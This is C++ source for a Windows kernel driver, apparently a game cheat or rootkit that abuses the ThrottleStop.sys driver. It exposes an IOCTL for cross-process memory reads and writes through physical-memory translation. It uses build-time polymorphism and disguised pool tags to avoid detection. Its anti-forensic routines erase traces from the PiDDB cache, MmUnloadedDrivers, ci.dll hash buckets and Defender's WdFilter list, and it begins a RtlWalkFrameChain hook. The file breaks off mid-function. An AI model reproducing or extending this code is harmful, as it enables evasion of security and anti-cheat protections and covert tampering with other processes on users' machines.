#include <ntifs.h>
#include <ntimage.h>
#pragma warning(disable: 4996)

// ============================================================================
// Build-time polymorphism — each compile produces unique constants
// ============================================================================
constexpr ULONG kBuildSeed =
    ((ULONG)(__TIME__[0]) * 31 + (ULONG)(__TIME__[1])) * 31 +
    ((ULONG)(__TIME__[3]) * 17 + (ULONG)(__TIME__[4])) * 13 +
    ((ULONG)(__TIME__[6]) * 7  + (ULONG)(__TIME__[7]));

#define TAG_POOL   (0x74634D6D ^ (kBuildSeed & 0x00FFFFFF))  // mimics Mm* tags
#define TAG_STAGE  (0x5346744E ^ (kBuildSeed & 0x00FFFFFF))  // mimics Ntfs tags
#define TAG_ALIGN  (0x6C467346 ^ (kBuildSeed & 0x00FFFFFF))  // mimics FsFl tags

// ============================================================================
// Communication protocol
// ============================================================================
#define IOCTL_COMM CTL_CODE(FILE_DEVICE_NETWORK, 0x2A3, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define COMM_OP_READ           0UL
#define COMM_OP_WRITE          1UL
#define COMM_OP_GET_BASE       2UL
#define COMM_OP_GET_MODULE     3UL
#define COMM_OP_GET_STATUS     4UL
#define COMM_OP_CLEAN_VEHICLE  5UL
#define COMM_OP_INIT_TARGET    6UL
#define COMM_MAX_SIZE          (64UL * 1024UL * 1024UL)

#define COMM_HANDSHAKE_MAGIC   (0xDEAD1337 ^ (kBuildSeed & 0xFFFF0000))
#define COMM_HANDSHAKE_REPLY   (0xC0FFEE42 ^ (kBuildSeed & 0x0000FFFF))

#define VEHICLE_DRIVER_NAME L"ThrottleStop.sys"

struct COMM_PACKET {
    ULONG     Operation;
    ULONG     ProcessId;
    ULONGLONG AddressSrc;
    ULONGLONG AddressDst;
    ULONG     Size;
    LONG      Status;
    CHAR      ModuleName[256];
};

// ============================================================================
// External declarations
// ============================================================================
extern "C" POBJECT_TYPE* IoDriverObjectType;

extern "C" NTKERNELAPI NTSTATUS NTAPI ObReferenceObjectByName(
    PUNICODE_STRING ObjectName, ULONG Attributes, PACCESS_STATE AccessState,
    ACCESS_MASK DesiredAccess, POBJECT_TYPE ObjectType,
    KPROCESSOR_MODE AccessMode, PVOID ParseContext, PVOID* Object);

extern "C" NTKERNELAPI PVOID NTAPI PsGetProcessPeb(PEPROCESS Process);
extern "C" NTKERNELAPI PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader(PVOID Base);
extern "C" NTKERNELAPI PVOID NTAPI PsGetProcessSectionBaseAddress(PEPROCESS Process);

extern "C" NTSTATUS NTAPI MmCopyMemory(
    PVOID TargetAddress, MM_COPY_ADDRESS SourceAddress,
    SIZE_T NumberOfBytes, ULONG Flags, PSIZE_T NumberOfBytesTransferred);

extern "C" NTSTATUS NTAPI MmCopyVirtualMemory(
    PEPROCESS SourceProcess, PVOID SourceAddress,
    PEPROCESS TargetProcess, PVOID TargetAddress,
    SIZE_T BufferSize, KPROCESSOR_MODE PreviousMode, PSIZE_T ReturnSize);

#ifndef MM_COPY_MEMORY_PHYSICAL
#define MM_COPY_MEMORY_PHYSICAL 0x1
#endif
#ifndef MM_COPY_MEMORY_VIRTUAL
#define MM_COPY_MEMORY_VIRTUAL  0x2
#endif

// ============================================================================
// Kernel structures
// ============================================================================
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _MI_UNLOADED_DRIVER {
    UNICODE_STRING Name;
    PVOID          StartAddress;
    PVOID          EndAddress;
    LARGE_INTEGER  CurrentTime;
} MI_UNLOADED_DRIVER, *PMI_UNLOADED_DRIVER;

typedef struct _PIDDBCACHE_ENTRY {
    LIST_ENTRY     List;
    UNICODE_STRING DriverName;
    ULONG          TimeDateStamp;
    NTSTATUS       LoadStatus;
    CHAR           _pad[16];
} PIDDBCACHE_ENTRY;

typedef struct _HASH_BUCKET_ENTRY {
    struct _HASH_BUCKET_ENTRY* Next;
    UNICODE_STRING             DriverName;
} HASH_BUCKET_ENTRY, *PHASH_BUCKET_ENTRY;

// ============================================================================
// Status reporting
// ============================================================================
struct BYPASS_STATUS {
    unsigned long    WalkChainHooked;
    unsigned long    WalkChainUsedGadget;
    unsigned __int64 WalkChainGadgetVA;
    unsigned __int64 WalkChainPtrVA;
    unsigned long    CaveInstalled;
    unsigned long    _pad;
    unsigned __int64 CaveVA;
    char             CaveModule[64];
    unsigned long    PiDDBCleared;
    unsigned long    UnloadedCleared;
    unsigned long    KDUPath;
    unsigned long    _pad2;
    unsigned __int64 NtBase;
    unsigned long    VehiclePiDDBCleared;
    unsigned long    VehicleUnloadedCleared;
    unsigned long    KernelHashBucketCleared;
    unsigned long    CiDllFound;
    unsigned long    WdFilterCleared;
    unsigned long    WdFilterPatternOk;
    unsigned long    PoolStomped;
    unsigned long    _pad3;
    unsigned long    DiskSynced;
    unsigned long    RawDiskSynced;
    unsigned long    PoolScrubbed;
    unsigned long    _pad5;
    unsigned long    HdrPatched;
    unsigned long    SectionHdrPatched;
    unsigned long    WalkChainActive;
    unsigned long    _pad7;
    unsigned __int64 WalkChainSlotVA;
    unsigned long    KernelHashBucketEmpty;
    unsigned long    CiGlobalsFound;
    unsigned long    VehicleUnloadedLive;
    unsigned long    CiSectionFound;
    unsigned long    PhysicalRW;
    unsigned long    StompTarget;
    unsigned long    HostDriver;
    unsigned long    DeferredCleanupDone;
};

static BYPASS_STATUS g_drvStatus = {};

// ============================================================================
// Globals
// ============================================================================
static PVOID              g_ntBase           = nullptr;
static PDEVICE_OBJECT     g_pDevice          = nullptr;
static PDRIVER_DISPATCH   g_origDevCtrl      = nullptr;
static PDRIVER_OBJECT     g_borrowedDrv      = nullptr;
static PUCHAR             g_cavePtr          = nullptr;

static PLDR_DATA_TABLE_ENTRY g_poisonedLdr      = nullptr;
static UNICODE_STRING        g_savedFullDllName = {};
static UNICODE_STRING        g_savedBaseDllName = {};

static PMI_UNLOADED_DRIVER   g_mmUnloadedArr   = nullptr;

static void** g_pWalkChainPtr = nullptr;
static void*  g_origWalkChain = nullptr;

// Cached game process for CR3-based R/W
static PEPROCESS g_cachedProcess   = nullptr;
static UINT64    g_cachedDirBase   = 0;

#if DBG
#define LOG(fmt, ...) DbgPrint(fmt, ##__VA_ARGS__)
#else
#define LOG(fmt, ...) ((void)0)
#endif

// ============================================================================
// Forward declarations
// ============================================================================
static VOID ClearUnloadedEntryByName(PVOID ntBase, PUNICODE_STRING targetName);
static NTSTATUS DispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp);

// ============================================================================
// PE / Utility functions
// ============================================================================

static BOOLEAN IsKernelPointer(PVOID addr) {
    return (ULONG_PTR)addr >= 0xFFFF800000000000ULL && MmIsAddressValid(addr);
}

static PUCHAR PatternScan(PUCHAR base, SIZE_T size, const UCHAR* pat, SIZE_T patLen) {
    if (size < patLen) return nullptr;
    for (SIZE_T i = 0; i <= size - patLen; i++) {
        BOOLEAN ok = TRUE;
        for (SIZE_T j = 0; j < patLen; j++) {
            if (pat[j] != 0xFF && base[i + j] != pat[j]) { ok = FALSE; break; }
        }
        if (ok) return base + i;
    }
    return nullptr;
}

static BOOLEAN GetImageSection(PVOID imageBase, const char* name,
                                PUCHAR* outBase, PSIZE_T outSize) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)imageBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (strncmp((char*)sec->Name, name, IMAGE_SIZEOF_SHORT_NAME) == 0) {
            *outBase = (PUCHAR)imageBase + sec->VirtualAddress;
            *outSize = (SIZE_T)sec->Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

static PVOID GetNtExport(PVOID moduleBase, const char* name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PUCHAR)moduleBase + dos->e_lfanew);
    ULONG expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRva) return nullptr;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)moduleBase + expRva);
    PULONG  funcs = (PULONG) ((PUCHAR)moduleBase + exp->AddressOfFunctions);
    PULONG  names = (PULONG) ((PUCHAR)moduleBase + exp->AddressOfNames);
    PUSHORT ords  = (PUSHORT)((PUCHAR)moduleBase + exp->AddressOfNameOrdinals);
    for (ULONG i = 0; i < exp->NumberOfNames; i++) {
        const char* exportName = (const char*)((PUCHAR)moduleBase + names[i]);
        if (_stricmp(exportName, name) == 0)
            return (PVOID)((PUCHAR)moduleBase + funcs[ords[i]]);
    }
    return nullptr;
}

// ============================================================================
// Kernel base discovery
// ============================================================================

static PVOID GetNtKernelBase(PDRIVER_OBJECT DriverObject) {
    if (!DriverObject) return nullptr;
    PVOID result = nullptr;
    __try {
        PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
        if (!ldr || !MmIsAddressValid(ldr)) return nullptr;
        UNICODE_STRING ntName;
        RtlInitUnicodeString(&ntName, L"ntoskrnl.exe");
        PLIST_ENTRY head = &ldr->InLoadOrderLinks;
        ULONG guard = 0;
        for (PLIST_ENTRY cur = head->Flink;
             cur && cur != head && ++guard < 512;
             cur = cur->Flink) {
            if (!MmIsAddressValid(cur)) break;
            PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
            if (entry->BaseDllName.Buffer &&
                RtlEqualUnicodeString(&entry->BaseDllName, &ntName, TRUE)) {
                result = entry->DllBase;
                break;
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        result = nullptr;
    }
    return result;
}

static PVOID GetNtKernelBaseAlt() {
    static const WCHAR* const kExports[] = {
        L"RtlWalkFrameChain",
        L"MmGetPhysicalAddress",
    };
    for (ULONG e = 0; e < ARRAYSIZE(kExports); e++) {
        UNICODE_STRING name;
        RtlInitUnicodeString(&name, kExports[e]);
        PUCHAR fn = (PUCHAR)MmGetSystemRoutineAddress(&name);
        if (!fn) continue;
        PUCHAR page = (PUCHAR)((ULONG_PTR)fn & ~0xFFFULL);
        for (ULONG i = 0; i < 0x1000; i++, page -= 0x1000) {
            if (!MmIsAddressValid(page)) continue;
            if (*(USHORT*)page != IMAGE_DOS_SIGNATURE) continue;
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)page;
            if (dos->e_lfanew <= 0 || dos->e_lfanew > 0x800) continue;
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(page + dos->e_lfanew);
            if (!MmIsAddressValid(nt)) continue;
            if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
            ULONG imgSize = nt->OptionalHeader.SizeOfImage;
            if (imgSize == 0 || fn < page || fn >= page + imgSize) continue;
            return page;
        }
    }
    return nullptr;
}

// ============================================================================
// Module enumeration helpers
// ============================================================================

static PLDR_DATA_TABLE_ENTRY FindModuleLdrEntry(PVOID ntBase, PCWSTR name) {
    PVOID listPtr = GetNtExport(ntBase, "PsLoadedModuleList");
    if (!listPtr || !IsKernelPointer(listPtr)) return nullptr;
    UNICODE_STRING target;
    RtlInitUnicodeString(&target, name);
    PLIST_ENTRY head = (PLIST_ENTRY)listPtr;
    for (PLIST_ENTRY e = head->Flink; e && e != head; e = e->Flink) {
        if (!MmIsAddressValid(e)) break;
        PLDR_DATA_TABLE_ENTRY ldr = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (!MmIsAddressValid(ldr->BaseDllName.Buffer)) continue;
        if (RtlEqualUnicodeString(&ldr->BaseDllName, &target, TRUE))
            return ldr;
    }
    return nullptr;
}

static PVOID FindModuleBase(PVOID ntBase, PCWSTR moduleName) {
    PLDR_DATA_TABLE_ENTRY ldr = FindModuleLdrEntry(ntBase, moduleName);
    return ldr ? ldr->DllBase : nullptr;
}

static PVOID FindSelfBase(PVOID hint) {
    PUCHAR page = (PUCHAR)((ULONG_PTR)hint & ~0xFFFULL);
    for (ULONG i = 0; i < 0x200; i++, page -= 0x1000) {
        if (!MmIsAddressValid(page)) continue;
        if (*(USHORT*)page != IMAGE_DOS_SIGNATURE) continue;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)page;
        if (dos->e_lfanew <= 0 || dos->e_lfanew > 0x1000) continue;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(page + dos->e_lfanew);
        if (!MmIsAddressValid(nt)) continue;
        if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
        ULONG imgSize = nt->OptionalHeader.SizeOfImage;
        if (imgSize && (PUCHAR)hint >= page && (PUCHAR)hint < page + imgSize)
            return page;
    }
    return nullptr;
}

// ============================================================================
// Physical memory R/W — CR3-based, leaves no process accounting traces
// ============================================================================

static NTSTATUS ReadPhysicalAddr(UINT64 pa, PVOID dst, SIZE_T size) {
    MM_COPY_ADDRESS addr;
    addr.PhysicalAddress.QuadPart = (LONGLONG)pa;
    SIZE_T copied = 0;
    return MmCopyMemory(dst, addr, size, MM_COPY_MEMORY_PHYSICAL, &copied);
}

static UINT64 TranslateVA(UINT64 dirBase, UINT64 va) {
    UINT64 val = 0;

    UINT64 pml4e_addr = (dirBase & ~0xFFFULL) + ((va >> 39) & 0x1FF) * 8;
    if (!NT_SUCCESS(ReadPhysicalAddr(pml4e_addr, &val, 8))) return 0;
    if (!(val & 1)) return 0;

    UINT64 pdpte_addr = (val & ~0xFFFULL) + ((va >> 30) & 0x1FF) * 8;
    if (!NT_SUCCESS(ReadPhysicalAddr(pdpte_addr, &val, 8))) return 0;
    if (!(val & 1)) return 0;
    if (val & 0x80) return (val & 0xFFFFFFC0000000ULL) + (va & 0x3FFFFFFF);

    UINT64 pde_addr = (val & ~0xFFFULL) + ((va >> 21) & 0x1FF) * 8;
    if (!NT_SUCCESS(ReadPhysicalAddr(pde_addr, &val, 8))) return 0;
    if (!(val & 1)) return 0;
    if (val & 0x80) return (val & 0xFFFFFFFE00000ULL) + (va & 0x1FFFFF);

    UINT64 pte_addr = (val & ~0xFFFULL) + ((va >> 12) & 0x1FF) * 8;
    if (!NT_SUCCESS(ReadPhysicalAddr(pte_addr, &val, 8))) return 0;
    if (!(val & 1)) return 0;
    return (val & ~0xFFFULL) + (va & 0xFFF);
}

static NTSTATUS PhysicalRead(UINT64 dirBase, UINT64 srcVa, PVOID dst, SIZE_T size) {
    SIZE_T copied = 0;
    while (copied < size) {
        UINT64 pa = TranslateVA(dirBase, srcVa + copied);
        if (!pa) return STATUS_ACCESS_VIOLATION;

        SIZE_T pageOff = (srcVa + copied) & 0xFFF;
        SIZE_T chunk = min(PAGE_SIZE - pageOff, size - copied);

        NTSTATUS st = ReadPhysicalAddr(pa, (PUCHAR)dst + copied, chunk);
        if (!NT_SUCCESS(st)) return st;
        copied += chunk;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS PhysicalWrite(UINT64 dirBase, UINT64 dstVa, PVOID src, SIZE_T size) {
    SIZE_T written = 0;
    while (written < size) {
        UINT64 pa = TranslateVA(dirBase, dstVa + written);
        if (!pa) return STATUS_ACCESS_VIOLATION;

        SIZE_T pageOff = (dstVa + written) & 0xFFF;
        SIZE_T chunk = min(PAGE_SIZE - pageOff, size - written);

        PHYSICAL_ADDRESS phys;
        phys.QuadPart = (LONGLONG)pa;
        PVOID mapped = MmMapIoSpace(phys, chunk, MmNonCached);
        if (!mapped) return STATUS_INSUFFICIENT_RESOURCES;

        RtlCopyMemory(mapped, (PUCHAR)src + written, chunk);
        MmUnmapIoSpace(mapped, chunk);
        written += chunk;
    }
    return STATUS_SUCCESS;
}

// Fallback using MmCopyVirtualMemory (used for module enumeration in target process)
static NTSTATUS SafeReadVm(PEPROCESS proc, UINT64 addr, PVOID dst, SIZE_T size) {
    if (addr == 0) return STATUS_ACCESS_VIOLATION;
    SIZE_T bytes = 0;
    return MmCopyVirtualMemory(proc, (PVOID)addr, PsGetCurrentProcess(), dst,
                               size, KernelMode, &bytes);
}

// Find module base in target process (PEB walk for COMM_OP_GET_MODULE)
static UINT64 FindProcessModule(PEPROCESS process, UINT64 dirBase, const CHAR* name) {
    PVOID pebRaw = PsGetProcessPeb(process);
    if (!pebRaw) return 0;

    UINT64 peb = (UINT64)pebRaw;
    UINT64 ldr = 0;
    if (!NT_SUCCESS(PhysicalRead(dirBase, peb + 0x18, &ldr, sizeof(ldr))) || !ldr)
        return 0;

    UINT64 listHead = ldr + 0x20;
    UINT64 flink = 0;
    if (!NT_SUCCESS(PhysicalRead(dirBase, listHead, &flink, sizeof(flink))) || !flink)
        return 0;

    for (INT guard = 0; guard < 512 && flink && flink != listHead; guard++) {
        UINT64 entry = flink - 0x10;

        UINT64 dllBase = 0;
        USHORT nameLen = 0;
        UINT64 nameBuf = 0;

        PhysicalRead(dirBase, entry + 0x30, &dllBase, sizeof(dllBase));
        PhysicalRead(dirBase, entry + 0x58, &nameLen, sizeof(nameLen));
        PhysicalRead(dirBase, entry + 0x60, &nameBuf, sizeof(nameBuf));

        if (nameBuf && nameLen >= 2 && nameLen <= 512) {
            WCHAR wide[256] = {};
            ULONG copyLen = min((ULONG)nameLen, (ULONG)(sizeof(wide) - sizeof(WCHAR)));
            if (NT_SUCCESS(PhysicalRead(dirBase, nameBuf, wide, copyLen))) {
                wide[copyLen / sizeof(WCHAR)] = L'\0';
                ULONG wlen = copyLen / sizeof(WCHAR);
                ULONG nlen = (ULONG)strlen(name);
                BOOLEAN match = (wlen == nlen);
                for (ULONG j = 0; j < wlen && match; j++) {
                    WCHAR wc = wide[j];
                    CHAR  nc = name[j];
                    if (wc >= L'A' && wc <= L'Z') wc += 32;
                    if (nc >= 'A'  && nc <= 'Z')  nc += 32;
                    if (wc != (WCHAR)(UCHAR)nc) match = FALSE;
                }
                if (match) return dllBase;
            }
        }

        UINT64 next = 0;
        if (!NT_SUCCESS(PhysicalRead(dirBase, flink, &next, sizeof(next))))
            break;
        flink = next;
    }
    return 0;
}

// ============================================================================
// Anti-forensic: PiDDB cache clearing
// ============================================================================

static BOOLEAN FindPiDDBTable(PVOID ntBase, PERESOURCE* outLock, PRTL_AVL_TABLE* outTable) {
    static const UCHAR patLock[] = {
        0x48, 0x8D, 0x0D, 0xFF, 0xFF, 0xFF, 0xFF,
        0xB2, 0x01,
        0x66, 0xFF, 0x88, 0xFF, 0xFF, 0xFF, 0xFF,
        0x90,
        0xE8
    };
    static const UCHAR patTable[] = {
        0x48, 0x8B, 0xF9, 0x33, 0xC0, 0x48, 0x8D, 0x0D
    };

    PUCHAR pageBase; SIZE_T pageSize;
    if (!GetImageSection(ntBase, "PAGE", &pageBase, &pageSize)) return FALSE;

    PUCHAR matchLock  = PatternScan(pageBase, pageSize, patLock,  sizeof(patLock));
    PUCHAR matchTable = PatternScan(pageBase, pageSize, patTable, sizeof(patTable));
    if (!matchLock || !matchTable) return FALSE;

    PERESOURCE     pLock  = (PERESOURCE)    (matchLock  + 7  + *(LONG*)(matchLock  + 3));
    PRTL_AVL_TABLE pTable = (PRTL_AVL_TABLE)(matchTable + 12 + *(LONG*)(matchTable + 8));

    if (!IsKernelPointer(pLock) || !IsKernelPointer(pTable)) return FALSE;

    *outLock  = pLock;
    *outTable = pTable;
    return TRUE;
}

static VOID ClearPiDDBEntryByName(PVOID ntBase, PUNICODE_STRING targetName) {
    PERESOURCE pLock; PRTL_AVL_TABLE pTable;
    if (!FindPiDDBTable(ntBase, &pLock, &pTable)) return;

    ExAcquireResourceExclusiveLite(pLock, TRUE);
    PVOID toDelete[16] = {};
    ULONG count = 0;
    for (PVOID node = RtlEnumerateGenericTableAvl(pTable, TRUE);
         node && count < ARRAYSIZE(toDelete);
         node = RtlEnumerateGenericTableAvl(pTable, FALSE)) {
        PIDDBCACHE_ENTRY* e = (PIDDBCACHE_ENTRY*)node;
        if (e->DriverName.Buffer &&
            RtlEqualUnicodeString(&e->DriverName, targetName, TRUE))
            toDelete[count++] = node;
    }
    for (ULONG i = 0; i < count; i++) {
        RemoveEntryList((PLIST_ENTRY)toDelete[i]);
        RtlDeleteElementGenericTableAvl(pTable, toDelete[i]);
    }
    if (count) {
        g_drvStatus.VehiclePiDDBCleared = 1;
        LOG("[+] PiDDB: removed %u entries for %wZ\n", count, targetName);
    }
    ExReleaseResourceLite(pLock);
}

// ============================================================================
// Anti-forensic: MmUnloadedDrivers
// ============================================================================

static PMI_UNLOADED_DRIVER FindMmUnloadedArray(PVOID ntBase) {
    static const UCHAR pat[] = { 0x4C, 0x8B, 0x15, 0xFF, 0xFF, 0xFF, 0xFF };
    PUCHAR textBase; SIZE_T textSize;
    if (!GetImageSection(ntBase, ".text", &textBase, &textSize)) return nullptr;
    PUCHAR match = PatternScan(textBase, textSize, pat, sizeof(pat));
    if (!match) return nullptr;
    PVOID* arrSlot = (PVOID*)(match + 7 + *(LONG*)(match + 3));
    if (!IsKernelPointer(arrSlot)) return nullptr;
    PMI_UNLOADED_DRIVER arr = *(PMI_UNLOADED_DRIVER*)arrSlot;
    if (!arr || !IsKernelPointer(arr)) return nullptr;
    return arr;
}

static VOID ClearUnloadedEntryByName(PVOID ntBase, PUNICODE_STRING targetName) {
    PMI_UNLOADED_DRIVER arr = FindMmUnloadedArray(ntBase);
    if (!arr) return;
    for (ULONG i = 0; i < 50; i++) {
        if (arr[i].Name.Buffer &&
            RtlEqualUnicodeString(&arr[i].Name, targetName, TRUE)) {
            RtlZeroMemory(&arr[i], sizeof(MI_UNLOADED_DRIVER));
            g_drvStatus.VehicleUnloadedCleared = 1;
            LOG("[+] Unloaded: zeroed slot %u for %wZ\n", i, targetName);
        }
    }
}

// ============================================================================
// Anti-forensic: ci.dll kernel hash bucket list
// ============================================================================

static BOOLEAN FindCiHashGlobals(PVOID ciBase, PVOID* outList, PERESOURCE* outLock) {
    static const UCHAR pat[] = {
        0x48, 0x8B, 0x1D, 0xFF, 0xFF, 0xFF, 0xFF,
        0xFF, 0xFF,
        0xF7, 0x43, 0x40, 0x00, 0x20, 0x00, 0x00
    };

    PUCHAR pageBase; SIZE_T pageSize;
    if (!GetImageSection(ciBase, "PAGE", &pageBase, &pageSize)) return FALSE;
    g_drvStatus.CiSectionFound = 1;

    PUCHAR match = PatternScan(pageBase, pageSize, pat, sizeof(pat));
    if (!match) return FALSE;

    *outList = (PVOID)(match + 7 + *(LONG*)(match + 3));

    SIZE_T lookback = (SIZE_T)(match - pageBase);
    if (lookback > 50) lookback = 50;
    for (SIZE_T j = lookback; j >= 7; j--) {
        PUCHAR q = match - j;
        if (q[0] != 0x48 || q[1] != 0x8D || q[2] != 0x0D) continue;
        *outLock = (PERESOURCE)(q + 7 + *(LONG*)(q + 3));
        return TRUE;
    }
    return FALSE;
}

static VOID ClearKernelHashBucketList(PVOID ntBase) {
    PVOID ciBase = FindModuleBase(ntBase, L"ci.dll");
    if (!ciBase) return;
    g_drvStatus.CiDllFound = 1;

    PVOID listHead; PERESOURCE lock;
    if (!FindCiHashGlobals(ciBase, &listHead, &lock)) return;
    g_drvStatus.CiGlobalsFound = 1;

    UNICODE_STRING vehicleName = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);

    KeEnterCriticalRegion();
    ExAcquireResourceExclusiveLite(lock, TRUE);

    if (*(PHASH_BUCKET_ENTRY*)listHead == nullptr) {
        g_drvStatus.KernelHashBucketEmpty = 1;
        ExReleaseResourceLite(lock);
        KeLeaveCriticalRegion();
        return;
    }

    PHASH_BUCKET_ENTRY* prev  = (PHASH_BUCKET_ENTRY*)listHead;
    PHASH_BUCKET_ENTRY  entry = nullptr;

    while ((ULONG_PTR)prev >= 0xFFFF800000000000ULL && (entry = *prev) != nullptr) {
        if ((ULONG_PTR)entry < 0xFFFF800000000000ULL) break;

        UNICODE_STRING* fullPath = &entry->DriverName;
        if (fullPath->Buffer && fullPath->Length > 0 &&
            (ULONG_PTR)fullPath->Buffer >= 0xFFFF800000000000ULL) {
            UNICODE_STRING baseName = *fullPath;
            for (USHORT i = fullPath->Length / sizeof(WCHAR); i > 0; i--) {
                if (fullPath->Buffer[i - 1] == L'\\') {
                    baseName.Buffer        = fullPath->Buffer + i;
                    baseName.Length        = fullPath->Length - (USHORT)(i * sizeof(WCHAR));
                    baseName.MaximumLength = baseName.Length;
                    break;
                }
            }
            if (RtlEqualUnicodeString(&baseName, &vehicleName, TRUE)) {
                *prev = entry->Next;
                ExFreePoolWithTag(entry, 0);
                g_drvStatus.KernelHashBucketCleared = 1;
                break;
            }
        }
        prev = &entry->Next;
    }

    ExReleaseResourceLite(lock);
    KeLeaveCriticalRegion();
}

// ============================================================================
// Anti-forensic: WdFilter driver list
// ============================================================================

typedef void (NTAPI *MpFreeDriverInfoExFn)(PVOID);

static BOOLEAN FindWdFilterGlobals(PVOID wdBase, PLIST_ENTRY* outHead,
                                   ULONG** outCount, PVOID** outArray,
                                   MpFreeDriverInfoExFn* outFree) {
    static const UCHAR patList[] = {
        0x48, 0x8B, 0x0D, 0xFF, 0xFF, 0xFF, 0xFF,
        0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0xFF,
        0x48, 0x39, 0x11
    };
    static const UCHAR patFree[] = {
        0x89, 0xFF, 0x08,
        0xE8, 0xFF, 0xFF, 0xFF, 0xFF,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0xE9
    };

    PUCHAR pageBase; SIZE_T pageSize;
    if (!GetImageSection(wdBase, "PAGE", &pageBase, &pageSize)) return FALSE;

    PUCHAR matchList = PatternScan(pageBase, pageSize, patList, sizeof(patList));
    PUCHAR matchFree = PatternScan(pageBase, pageSize, patFree, sizeof(patFree));
    if (!matchList || !matchFree) return FALSE;

    PVOID* pBlink = (PVOID*)(matchList + 7 + *(INT32*)(matchList + 3));
    PLIST_ENTRY pHead = (PLIST_ENTRY)((PUCHAR)pBlink - sizeof(PVOID));
    ULONG* pCount = (ULONG*)(matchList + 13 + *(INT32*)(matchList + 9));
    PVOID* pArray = *(PVOID**)((PUCHAR)pCount + 8);
    MpFreeDriverInfoExFn fn = (MpFreeDriverInfoExFn)(matchFree + 8 + *(INT32*)(matchFree + 4));

    if (!IsKernelPointer(pHead) || !IsKernelPointer(pCount) || !IsKernelPointer(fn))
        return FALSE;

    *outHead  = pHead;
    *outCount = pCount;
    *outArray = pArray;
    *outFree  = fn;
    g_drvStatus.WdFilterPatternOk = 1;
    return TRUE;
}

static VOID ClearWdFilterDriverList(PVOID ntBase) {
    PVOID wdBase = FindModuleBase(ntBase, L"WdFilter.sys");
    if (!wdBase) return;

    PLIST_ENTRY          pHead;
    ULONG*               pCount;
    PVOID*               pArray;
    MpFreeDriverInfoExFn MpFreeDriverInfoEx;
    if (!FindWdFilterGlobals(wdBase, &pHead, &pCount, &pArray, &MpFreeDriverInfoEx))
        return;

    UNICODE_STRING vehicleName = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);

    for (PLIST_ENTRY entry = pHead->Flink;
         entry && entry != pHead && MmIsAddressValid(entry);
         entry = entry->Flink) {
        UNICODE_STRING* ustr = (UNICODE_STRING*)((PUCHAR)entry + 0x10);
        if (!ustr->Buffer || !ustr->Length || !MmIsAddressValid(ustr->Buffer))
            continue;

        UNICODE_STRING baseName = *ustr;
        for (USHORT i = ustr->Length / sizeof(WCHAR); i > 0; i--) {
            if (ustr->Buffer[i - 1] == L'\\') {
                baseName.Buffer        = ustr->Buffer + i;
                baseName.Length        = ustr->Length - (USHORT)(i * sizeof(WCHAR));
                baseName.MaximumLength = baseName.Length;
                break;
            }
        }
        if (!RtlEqualUnicodeString(&baseName, &vehicleName, TRUE))
            continue;

        PVOID sameIndexList = (PVOID)((PUCHAR)entry - 0x10);
        if (pArray) {
            PVOID sentinel = (PVOID)((PUCHAR)pCount + 1);
            for (int k = 0; k < 256; k++) {
                if (!MmIsAddressValid(&pArray[k])) break;
                if (pArray[k] == sameIndexList) { pArray[k] = sentinel; break; }
            }
        }

        RemoveEntryList(entry);
        (*pCount)--;

        PVOID  driverInfo = (PVOID)((PUCHAR)entry - 0x20);
        USHORT magic      = *(USHORT*)driverInfo;
        if (magic == 0xDA18)
            MpFreeDriverInfoEx(driverInfo);

        g_drvStatus.WdFilterCleared = 1;
        return;
    }
}

// ============================================================================
// RtlWalkFrameChain hook — gadget-based
// ============================================================================

static PVOID FindZeroRetGadget(PVOID ntBase) {
    PUCHAR base; SIZE_T size;
    if (!GetImageSection(ntBase, ".text", &base, &size)) return nullptr;
    static const UCHAR pat[] = { 0x33, 0xC0, 0xC3 };
    return PatternScan(base, size, pat, sizeof(pat));
}

static void** FindRtlWalkFrameChainPtr(PVOID ntBase) {
    UNICODE_STRING name = RTL_CONSTANT_STRING(L"RtlWalkFrameChain");
    PUCHAR fn = (PUCHAR)MmGetSystemRoutineAddress(&name);
    if (!fn) return nullptr;

    PUCHAR ntTextBase = nullptr; SIZE_T ntTextSize = 0;
